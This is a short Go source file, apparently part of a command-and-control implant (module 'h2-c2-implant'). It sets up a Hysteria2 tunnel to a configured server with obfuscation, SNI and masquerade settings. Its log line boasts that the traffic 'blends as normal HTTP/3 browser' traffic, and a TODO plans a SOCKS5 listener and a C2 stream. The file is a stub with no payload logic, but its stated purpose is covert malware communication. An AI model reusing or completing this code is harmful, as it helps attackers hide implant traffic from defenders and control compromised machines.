package transport

import (
	"h2-c2-implant/config"
	"log"

	"github.com/daeuniverse/outbound/protocol/hysteria2"
)

type HysteriaTunnel struct {
	cfg    *config.Config
	client *hysteria2.Client
}

func NewHysteriaTunnel(cfg *config.Config) *HysteriaTunnel {
	return &HysteriaTunnel{cfg: cfg}
}

func (t *HysteriaTunnel) Connect() error {
	// Pick random server from list (real version randomises per beacon)
	opts := hysteria2.ClientOptions{
		Server:     t.cfg.ServerList[0],
		Password:   t.cfg.Password,
		SNI:        t.cfg.SNI,
		Obfs:       t.cfg.Obfs,
		Masquerade: t.cfg.Masquerade,
	}

	var err error
	t.client, err = hysteria2.NewClient(opts)
	if err != nil {
		return err
	}

	log.Println("[+] Connected to Hysteria2 tunnel — traffic blends as normal HTTP/3 browser shit")
	return nil
}

// TODO: Add methods for DialContext, SOCKS5 listener, direct stream for C2
